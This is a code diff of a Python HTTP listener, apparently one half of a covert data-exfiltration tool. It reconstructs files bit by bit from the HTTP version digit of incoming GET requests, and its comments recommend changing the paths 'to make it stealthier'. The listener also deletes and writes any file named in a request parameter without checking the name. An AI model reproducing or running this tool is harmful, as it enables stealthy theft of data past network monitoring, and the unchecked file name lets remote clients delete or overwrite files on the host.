@@ -1,24 +1,31 @@
+import os
 import sys
 import time
 from http.server import BaseHTTPRequestHandler,HTTPServer
 from urllib.parse import urlparse,urlsplit,parse_qs
 
-file_bits = ""
-time_ = time.time()
-send_data_path = "/" # it is possible to use any path but it must be the same in listener.py and sender.py
-generate_file_path = "/newfile" # it is possible to use any path but it must be the same in listener.py and sender.py
+# It is possible to use any value for these 3 paths to make it stealthier but it must be the same in listener.py and sender.py
+send_data_path = "/bit" 
+generate_file_path = "/newfile"
+last_bits_path = "/lastbits"
+# Enable or disable requests logging
 debug = True
+byte_aux = ""
+local_file_name = ""
 
-# https://stackoverflow.com/questions/32675679/convert-binary-string-to-bytearray-in-python-3
+
 def bitstring_to_bytes(s):
     return int(s, 2).to_bytes((len(s) + 7) // 8, byteorder='big')
 
 
-def create_file(local_file_name, file_bits):
-    file_bytes = bitstring_to_bytes(file_bits)
-    f = open(local_file_name, "wb")
-    f.write(file_bytes)
-    f.close()
+def add_bit(fname, byte_aux):
+    written_byte_block = 10
+    if (len(byte_aux)%(8*written_byte_block)==0):
+        file_byte = bitstring_to_bytes(byte_aux)
+        f = open(fname, "ab")
+        f.write(file_byte)
+        f.close()
+        return True
 
 
 class S(BaseHTTPRequestHandler):
@@ -28,20 +35,28 @@ class S(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_GET(self):
-        global file_bits, time_
+        global byte_aux,local_file_name
         self._set_response()
         if self.path == send_data_path:
             version_digit = self.request_version.replace("HTTP/1.","")
-            file_bits += version_digit
-            if (len(file_bits) % 8000 == 0):
-                taken_time_ = int(time.time() - time_)
-                if debug: print("%s KB in %s s"%(str(len(file_bits)/8000),str(taken_time_)))
+            byte_aux += version_digit
+            byte_written = add_bit(local_file_name,byte_aux)
+            if byte_written:
+                byte_aux = ""
         elif self.path.startswith(generate_file_path):
             params = parse_qs(urlsplit(self.path).query)
-            if 'f' in params and file_bits != "":
+            if 'f' in params:
                 local_file_name = (params['f'][0])
-                create_file(local_file_name, file_bits)
-                file_bits = ""
+                if os.path.isfile(local_file_name):
+                    os.remove(local_file_name)
+                byte_aux = ""
+        elif self.path == last_bits_path:
+            if byte_aux != "":
+                file_byte = bitstring_to_bytes(byte_aux)
+                f = open(local_file_name, "ab")
+                f.write(file_byte)
+                f.close()
+
 
     def do_POST(self):
         self._set_response()
